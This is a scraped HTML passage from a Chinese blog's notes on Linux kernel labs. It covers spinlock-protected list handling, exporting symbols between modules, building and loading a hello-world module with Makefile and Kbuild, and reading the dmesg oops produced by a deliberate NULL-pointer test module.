class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical sections ends here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_sync_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line"></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after first add&quot;</span>);</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_sync_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = list_entry(head.prev, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_sync_init);</span><br><span class="line">module_exit(list_sync_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">6</span>-<span class="built_in">list</span>-sync<span class="meta"># insmod list-sync.ko                </span></span><br><span class="line">list_sync: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294905468</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294905468</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">6</span>-<span class="built_in">list</span>-sync<span class="meta"># rmmod list-sync.ko                 </span></span><br><span class="line">after removing expired: [                                                       </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">]       </span><br></pre></td></tr></table></figure>
<ul>
<li>一般有循环的地方都要加锁（这里加的是自旋锁）</li>
</ul>
<p>7.Test module calling in our list module：</p>
<ul>
<li>从位于目录 <code>6-list-sync/</code> 的模块中导出各个符号</li>
<li>删除 <code>6-list-sync/</code> 的模块中所有的锁</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 lab3 - task 7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Test list processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_test_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: Uncomment after exporting the symbols in 6-list-sync. */</span></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after new addition&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: Uncomment after exporting the symbols in 6-list-sync. */</span></span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_test_init);</span><br><span class="line">module_exit(list_test_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># insmod ./skels/kernel_api/6-list-sync/list-sync.ko              </span></span><br><span class="line">list_sync: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294904706</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294904706</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~<span class="meta"># insmod ./skels/kernel_api/7-list-test/list-test.ko              </span></span><br><span class="line">after <span class="keyword">new</span> addition: [                                                           </span><br><span class="line">(<span class="number">238</span>, <span class="number">4294906931</span>)                                                               </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294906931</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294906931</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294906931</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<ul>
<li>在加载模块的时候出现了死锁的问题，最后才发现需要把 <code>Synchronizing list work</code> 中的锁删掉 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insmod/<span class="number">238</span> is trying to acquire lock:                                           </span><br><span class="line">d0847110 (lockA)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: task_info_add_to_list+<span class="number">0x11</span>/<span class="number">0xb0</span> [list_sync]   </span><br><span class="line">                                                                                </span><br><span class="line">but task is already holding lock:                                               </span><br><span class="line">d0847110 (lockA)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: task_info_add_to_list+<span class="number">0x11</span>/<span class="number">0xb0</span> [list_sync]   </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/10/Linux-Lab1-Kernel%20modules/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/10/Linux-Lab1-Kernel%20modules/" class="post-title-link" itemprop="url">Linux-Lab1-Kernel modules</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-10 19:33:46 / Modified: 19:34:49" itemprop="dateCreated datePublished" datetime="2022-10-10T19:33:46+08:00">2022-10-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel modules</strong></p>
<ul>
<li>创建简单模块</li>
<li>描述内核模块编译的过程</li>
<li>介绍如何将模块与内核一起使用</li>
<li>简单的内核调试方法</li>
</ul>
<p><strong>An example of a kernel module</strong></p>
<p>下面是一个非常简单的内核模块示例：（源代码在 <code>linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.c</code> 文件中）</p>
<ul>
<li>当加载到内核中时，它将生成消息 “Hello”</li>
<li>卸载内核模块时，将生成消息 “Goodbye”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_debug(<span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_debug(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>生成的消息不会显示在控制台上，但会保存在为此专门保留的内存区域中，日志记录守护程序 （syslog） 将从中提取这些消息</li>
<li>要显示内核消息，可以使用 dmesg 命令或检查日志</li>
</ul>
<p><strong>Compiling kernel modules</strong></p>
<p>编译内核模块不同于编译用户程序：</p>
<ul>
<li>首先，应使用其他标头（<code>#include&lt;&gt;</code>）</li>
<li>此外，模块不应链接到库</li>
<li>最后，必须使用与加载模块的内核相同的选项来编译模块</li>
</ul>
<p>由于上述原因，有一种标准方法用于编译内核，这种方法需要两个文件 <code>Makefile</code> <code>Kbuild</code></p>
<p><code>Makefile</code>：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KDIR = /lib/modules/`uname -r`/build</span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/lib/modules</code> 里面是内核模块，具有用于构建源代码的软链接</li>
<li>“-C” 选项的作用是：<ul>
<li>指将当前工作目录转移到你所指定的位置：<code>/lib/modules/`uname -r`/build</code></li>
</ul>
</li>
<li>“M=” 选项的作用是：<ul>
<li>当用户需要以某个内核为基础编译一个外部模块的话，需要在命令中加入 <code>M=dir</code></li>
<li>程序会自动到你所指定的 <code>dir</code> 目录中查找模块源码，将其编译，生成KO文件</li>
</ul>
</li>
<li>先设置当前工作目录为 <code>KDIR</code>（为了使用其“用于构建源代码的软链接”），然后在 <code>kbuild</code> 文件中寻找模块源码，最后使用 <code>KDIR</code> 中的软链接进行编译</li>
</ul>
<p><code>Kbuild</code>：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ccflags-y = -Wno-unused-function -Wno-unused-label -Wno-unused-variable -DDEBUG</span><br><span class="line"></span><br><span class="line">obj-m = hello_mod.o</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Kbuild</code> 中具有具体的编译参数，并且会指定模块源码的名称</li>
</ul>
<p>直接使用 <code>make</code> 命令就可以编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ make      </span><br><span class="line">make -C /lib/modules/`uname -r`/build M=`pwd`</span><br><span class="line">make[1]: 进入目录“/usr/src/linux-headers-5.15.0-48-generic”</span><br><span class="line">  CC [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.o</span><br><span class="line">  MODPOST /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/Module.symvers</span><br><span class="line">  CC [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.mod.o</span><br><span class="line">  LD [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko</span><br><span class="line">  BTF [M] /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko</span><br><span class="line">Skipping BTF generation for /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko due to unavailability of vmlinux</span><br><span class="line">make[1]: 离开目录“/usr/src/linux-headers-5.15.0-48-generic”</span><br></pre></td></tr></table></figure>
<p>不过这是内核模块的标准编译方式，使用了本机的 <code>/lib/modules/</code></p>
<ul>
<li>如果想编译用于虚拟机的内核模块，则需要对 <code>KDIR</code> 作出修改：</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KDIR = /home/yhellow/linux</span><br></pre></td></tr></table></figure>
<p>如果编译时需要使用多个子模块，就使用如下 <code>Kbuild</code> 示例：（示例文件在 <code>linux/tools/labs/skels/kernel_modules/4-multi-mod</code> 目录中）</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ccflags-y = -Wno-unused-function -Wno-unused-label -Wno-unused-variable</span><br><span class="line"></span><br><span class="line">obj-m        = supermodule.o</span><br><span class="line">supermodule-y = mod1.o mod2.o</span><br></pre></td></tr></table></figure>
<p><strong>Loading/UnLoading a kernel module</strong></p>
<p>要装入内核模块，使用 <code>insmod</code> 命令</p>
<p>要从内核中卸载模块，使用 <code>rmmod</code> 命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insmod module.ko</span><br><span class="line">rmmod module.ko</span><br></pre></td></tr></table></figure>
<ul>
<li>加载内核模块时，将执行指定为宏参数的例程</li>
<li>同样，当卸载模块时，将执行指定为 参数的例程</li>
</ul>
<p>加载/卸载内核模块的完整示例如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ sudo insmod hello_mod.ko</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ dmesg | tail -1</span><br><span class="line">[ 1817.709484] Hello!</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ ls /sys/module | grep hello </span><br><span class="line">hello_mod</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ sudo rmmod hello_mod.ko </span><br><span class="line">➜  1-2-test-mod git:(master) ✗ dmesg | tail -2            </span><br><span class="line">[ 1817.709484] Hello!</span><br><span class="line">[ 1943.965668] Goodbye!</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ ls /sys/module | grep hello</span><br></pre></td></tr></table></figure>
<p><strong>Kernel Module Debugging</strong></p>
<p>对内核模块进行故障排除比调试常规程序要复杂得多：</p>
<ul>
<li>内核模块中的错误可能导致阻塞整个系统</li>
<li>故障排除速度大大减慢</li>
</ul>
<p>为避免重新启动，建议使用虚拟机（<code>qemu, virtualbox, vmware</code>）</p>
<p>当包含错误的模块插入内核时，它最终会生成一个 kernel oops（内核警告）：</p>
<ul>
<li>kernel oops 源自于内核检测到的无效操作，只能由内核生成</li>
<li>出现 kernel oops 后，内核将继续进行工作</li>
<li>kernel oops 将会作为一个消息，内核生成的消息被保存在日志中，可以使用 dmesg 命令显示</li>
</ul>
<p>为了确保没有内核消息丢失，建议直接从控制台插入测试内核，或定期检查内核消息（值得注意的是，由于编程错误，也可能因硬件错误而发生 kernel oops）</p>
<p>相对应的，如果内核发生致命错误，则会产生 kernel panic（内核崩溃）：</p>
<ul>
<li>出现 kernel panic 后，系统无法返回到稳定状态</li>
</ul>
<p>看看下面的内核模块，其中包含一个生成 kernel oops 的错误：（源代码在 <code>linux/tools/labs/skels/kernel_modules/5-oops-mod/oops_mod.c</code> 文件中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Oops generating module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;So2rul Esforever&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_oops_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;before init\n&quot;</span>);</span><br><span class="line">	*p = <span class="string">&#x27;a&#x27;</span>; <span class="comment">/* 空指针赋值 */</span></span><br><span class="line">	pr_info(<span class="string">&quot;after init\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_oops_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;module goes all out\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_oops_init);</span><br><span class="line">module_exit(my_oops_exit);</span><br></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  5-oops-mod git:(master) ✗ sudo insmod oops_mod.ko </span><br><span class="line">[1]    13015 killed     sudo insmod oops_mod.ko</span><br></pre></td></tr></table></figure>
<ul>
<li>内核检测到了 kernel oops，并且 <code>kill</code> 掉了该进程，使用 <code>dmesg</code> 查看下系统日志：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">➜  5-oops-mod git:(master) ✗ dmesg | tail -64</span><br><span class="line">[  139.812510] before init</span><br><span class="line">[  139.812512] BUG: kernel NULL pointer dereference, address: 0000000000000000</span><br><span class="line">[  139.812515] #PF: supervisor write access in kernel mode</span><br><span class="line">[  139.812516] #PF: error_code(0x0002) - not-present page</span><br><span class="line">[  139.812517] PGD 0 P4D 0 </span><br><span class="line">[  139.812519] Oops: 0002 [#1] SMP NOPTI</span><br><span class="line">[  139.812521] CPU: 1 PID: 3543 Comm: insmod Tainted: G           OE     5.15.0-48-generic #54~20.04.1-Ubuntu</span><br><span class="line">[  139.812523] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020</span><br><span class="line">[  139.812524] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812528] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812528] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812530] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812530] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812531] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812532] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812533] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812534] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812535] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812536] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812557] PKRU: 55555554</span><br><span class="line">[  139.812558] Call Trace:</span><br><span class="line">[  139.812559]  &lt;TASK&gt;</span><br><span class="line">[  139.812561]  do_one_initcall+0x46/0x1e0</span><br><span class="line">[  139.812565]  ? __cond_resched+0x19/0x40</span><br><span class="line">[  139.812568]  ? kmem_cache_alloc_trace+0x15a/0x420</span><br><span class="line">[  139.812571]  do_init_module+0x52/0x230</span><br><span class="line">[  139.812574]  load_module+0x1376/0x1600</span><br><span class="line">[  139.812576]  __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812578]  ? __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812579]  __x64_sys_finit_module+0x1a/0x20</span><br><span class="line">[  139.812581]  do_syscall_64+0x59/0xc0</span><br><span class="line">[  139.812583]  ? fput+0x13/0x20</span><br><span class="line">[  139.812584]  ? ksys_mmap_pgoff+0x14b/0x2a0</span><br><span class="line">[  139.812586]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812588]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812589]  ? syscall_exit_to_user_mode+0x27/0x50</span><br><span class="line">[  139.812591]  ? __x64_sys_mmap+0x33/0x50</span><br><span class="line">[  139.812592]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812593]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812594]  entry_SYSCALL_64_after_hwframe+0x61/0xcb</span><br><span class="line">[  139.812596] RIP: 0033:0x7f0f9792173d</span><br><span class="line">[  139.812598] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 